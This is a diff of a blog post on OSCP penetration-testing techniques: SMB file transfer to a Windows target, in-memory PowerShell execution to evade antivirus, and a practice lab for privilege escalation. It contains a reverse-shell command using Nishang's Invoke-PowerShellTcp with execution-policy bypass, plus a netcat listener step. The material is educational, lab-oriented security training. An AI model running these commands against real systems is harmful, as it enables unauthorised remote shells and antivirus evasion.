@@ -14,25 +14,29 @@ As stated in the [OSCP Review Post](/oscp/OSCP-Review), I came across many good 
 While there are numerous methods to transfer files from your host Kali to victim Windows, I found SMB to be the most reliable one. 
 - Install impacket on your kali (It comes preinstalled most of the times, located at /usr/share/impacket/examples/).
 - Start the SMB server by running `smbserver.py`:  
-![image-center](/assets/images/oscp/1/smbserver.png)
+![image-center](/assets/images/oscp/1/smbshare.png)
 This will share the `/tmp/smbshare` directory over smb as `myshare`.
 - All the files inside `/tmp/smbshare` can now directly be accessed on the victim windows:  
-![image-center](/assets/images/oscp/1/smbshare.png)
+![image-center](/assets/images/oscp/1/smbshare1.png)
 - For more convenience, this SMB share can be  mounted directly on the windows as a drive:
-	- Check currently mounted shares by running `net view`:
-	- Mount your `myshare` as drive `Z` (or anything else) using the command
+	- Check currently mounted shares by running `net use`:
+	- Mount your `myshare` as drive `Z` (or any other letter) using the command
 	`net use Z: \\<IP>\myshare`
 		![image-center](/assets/images/oscp/1/smbmount.png)
 - Now, you can simply change dir to `Z` and browse the shared files as a drive on the victim system.  
 ![image-center](/assets/images/oscp/1/smbmount2.png)
-- The mount can be disconnected with command `net use Z: /d` once you are done with it.  
-Another easy way to transfer files is over http using python's SimpleHTTPServer. We will take a look at it and download files using PowerShell in the following section.
+- The mount can be disconnected with command `net use Z: /d` once you are done with it.   
+{: .text-justify}
+
+Another easy way to transfer files is over http using python's SimpleHTTPServer or Apache. We will take a look at it and download files using PowerShell in the following section.
 {: .text-justify}
 
 ---
 ## PowerShell
 
 PowerShell provides an easy way to perform post exploitation and privilege escalation activities with the help of various PS modules. Two of the most useful modules that I came across were: [Nishang's Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) and [Powersploit's PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)   
+{: .text-justify}
+
 While most of the newer Windows OS have a functional antivirus monitoring and prohibiting the execution of programs from storage, PowerShell provides us with an option to bypass this and run programs directly from the memory. This can help us evade the antivirus and easily run exploits or post-exploitation scripts.
 1. Share your files using python's `SimpleHTTPServer` or Apache.   
 ![image-center](/assets/images/oscp/1/http1.png)
@@ -63,8 +67,7 @@ We will share our `Invoke-PowerShellTcp.ps1` over http, download it to the victi
 ### Method 2: Using SMB (Gets blocked by Windows AV)
 
 While this method is convenient for sharing multiple files over smb, but since we are executing `Invoke-PowerShellTcp.ps1` from storage (drive Z), it has a good chance of getting blocked by the Windows Antivirus. 
-1. On your Kali, copy `Invoke-PowerShellTcp.ps1` inside `myshare` and start the smbserver.  
-![image-center](/assets/images/oscp/1/ps1.png)
+1. On your Kali, copy `Invoke-PowerShellTcp.ps1` inside `myshare` and start the smbserver. 
 2. Start netcat listener on Kali.
 3. You can mount the smbshare as Z, change dir to Z, and execute the script with command:
 `powershell.exe -nop -ep bypass -c "Import-Module .\Invoke-PowerShellTcp.ps1; Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"`
@@ -98,11 +101,12 @@ We can grab a free copy of Windows Evaluation versions directly from [Microsoft]
 {: .text-justify}
 
 [Note: Take a snapshot of the windows VM before starting the setup]  
-The setup is fairly simple: Copy the lpe_windows_setup.bat script to VM and run it as an Administrator. 
+The setup is fairly simple: Copy the lpe_windows_setup.bat script to VM and run it as an Administrator. A few exercises will not be setup (1,9,14) as those are platform specific and are not included in the setup script.
 {: .text-justify}
 
+In the next part, we will go through the exercises from lpeworkshop and see how we can indentify and exploit the vulnerabilties with the help of `PowerUp1.ps1` 
 ---
 ## Additional resources
 
-- https://hacknpentest.com/windows-privilege-escalation-using-powershell/
-- https://github.com/J3rryBl4nks/LPEWalkthrough
+- [](https://hacknpentest.com/windows-privilege-escalation-using-powershell/)
+- [](https://github.com/J3rryBl4nks/LPEWalkthrough)
